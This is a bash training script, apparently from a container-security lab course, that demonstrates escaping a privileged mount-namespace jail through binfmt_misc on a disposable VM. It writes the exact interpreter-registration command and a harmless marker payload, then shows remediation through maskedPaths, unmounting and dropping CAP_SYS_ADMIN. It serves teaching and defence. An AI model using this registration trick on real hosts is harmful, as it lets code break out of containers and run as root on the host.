#!/usr/bin/env bash
# act3/03-binfmt_misc.sh — escape 3 of 4: binfmt_misc.
# Terminal: lab (B) + host (A). Uses sudo. DISPOSABLE LAB VM ONLY.
#
# The register file is HOST-shared: the trap unregisters whatever this
# script registers, even though the jail's mount ns dies with the shell.
#
# Beats: PREREQ → ESCAPE → REMEDIATE (same rhythm).

set -euo pipefail

hr()   { printf '\n\033[1m%s\033[0m\n' "----------------------------------------------------------------"; }
hdr()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
say()  { printf '  %s\n' "$*"; }
pause(){ printf '\n  \033[2m[press Enter for the next beat]\033[0m'; read -r; }
JAIL_PROMPT='\[\033[35m\][PRIVILEGED-JAIL]\[\033[0m\] \$ '

PAYLOAD_DIR=/tmp/lab-escape
MARKER=$PAYLOAD_DIR/marker
REG=/proc/sys/fs/binfmt_misc/register
UNREG=/proc/sys/fs/binfmt_misc/labescape
BLOB=$PAYLOAD_DIR/blob.bin

[[ $EUID -eq 0 ]] || exec sudo "$0" "$@"

mounted() { grep -qs binfmt /proc/mounts; }
cleanup() {
    [[ -f "$UNREG" ]] && echo -1 > "$UNREG" 2>/dev/null && say "cleanup: unregistered binfmt_misc handler 'labescape'"
    rm -rf "$PAYLOAD_DIR"
    return 0
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------
hdr "BEAT 1 — PREREQ: the registration desk"
hr
say "binfmt_misc lets the kernel run an INTERPRETER for any file whose"
say "header matches a registered magic — that is how WSL runs .exe and"
say "how the kernel runs Java-class files on some distros."
say "The interpreter path resolves in the INIT mount namespace. You know"
say "what that means by now."
say ""
say "Mount the desk if needed (in your own mount ns, host-unaffected):"
if ! mounted; then
    mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>/dev/null \
        && say "    (script mounted binfmt_misc for this session)" \
        || say "    mount failed — beat 2 becomes the remediation demo"
else
    say "    already mounted on this host (00-check noted this)"
fi
ls /proc/sys/fs/binfmt_misc/ | sed 's/^/    /'
pause

# --------------------------------------------------------------------------
hdr "BEAT 2 — ESCAPE: register an interpreter for a magic string, exec a 'binary'"
hr
mkdir -p "$PAYLOAD_DIR"
cat > "$PAYLOAD_DIR/payload.sh" <<'EOF'
#!/bin/sh
echo "binfmt_misc ESCAPE: interpreter ran as $(id -un) pid $$ for file $1 at $(date)" >> /tmp/lab-escape/marker
EOF
chmod +x "$PAYLOAD_DIR/payload.sh"
printf 'LAB-magic-binary\nnot really an executable\n' > "$BLOB"
chmod +x "$BLOB"
say "Payload + a fake 'binary' whose first bytes are the magic LAB created."
say ""
say "Into the jail. Run inside:"
say "    echo ':labescape:E::LAB::/tmp/lab-escape/payload.sh:' > $REG"
say "    ls /proc/sys/fs/binfmt_misc/         (your registration: labescape)"
say "    /tmp/lab-escape/blob.bin             (execute 'the binary')"
say "Read what happened: the kernel could not run blob.bin — so it handed"
say "it to YOUR interpreter. As real root. In the init mount ns."
say "Then Terminal A:"
say "    cat /tmp/lab-escape/marker           (fired)"
hr
env PS1="$JAIL_PROMPT" unshare -m bash
if [[ -f "$MARKER" ]] && grep -q binfmt "$MARKER"; then
    say "ESCAPE CONFIRMED — note what the 'binary' needed to be: NOTHING."
    say "No compiler, no exploit primitive — the attacker writes a text file"
    say "starting with 3 bytes and execs it."
else
    say "no binfmt line in marker — check registration and retry, or read dmesg"
fi
pause

# --------------------------------------------------------------------------
hdr "BEAT 3 — REMEDIATE: no registration desk, no escape"
hr
say "Run inside a fresh jail:"
say "    umount /proc/sys/fs/binfmt_misc 2>/dev/null || echo '(busy — host-shared mount)'"
say "    echo ':labescape:E::LAB::/tmp/lab-escape/payload.sh:' > $REG"
say "    (fails: No such file or directory — the desk is gone, in YOUR ns)"
say "    /tmp/lab-escape/blob.bin             (No such file — nothing to run it)"
say ""
say "Kubernetes mapping — the easiest kill in the whole act:"
say "  Containers do NOT mount binfmt_misc. It is absent in the default"
say "  mount set; the registration file simply does not exist in the cage."
say "  (Your VM host has it mounted — that is why beat 1 saw it. Inside a"
say "  normal pod, beat 1's ls would fail.)"
say "  If it IS mounted (privileged pods, some host debug images):"
say "  maskedPaths + readOnlyRootFilesystem + drop CAP_SYS_ADMIN all apply."
hr
env PS1="$JAIL_PROMPT" unshare -m bash

# --------------------------------------------------------------------------
hdr "RESIDUE CHECK (automatic)"
[[ -f "$UNREG" ]] && say "handler still registered: YES (trap will remove it)" || say "handler still registered: NO"
say "binfmt_misc mount (host): $(mounted && echo 'mounted (host default — untouched)' || echo 'not mounted')"

hdr "CHECK QUESTIONS (act3/03)"
cat <<'EOF'
  1. This technique needs the attacker to EXECUTE a file inside the cage.
     In an exploit chain, what primitive does the attacker need first,
     and which act3 technique needed NO in-cage execution at all?
  2. Why is 'interpreter path resolves in init mount ns' the SAME bridge
     as act2/02, and why did the fix not need to touch the interpreter
     file at all?
  3. Compare the remediation effort: maskedPaths vs unmounting binfmt_misc.
     Which is defense, which is configuration, which is BOTH?

  Next: act3-escapes/04-release_agent.sh — the finale, and its death on v2.
EOF
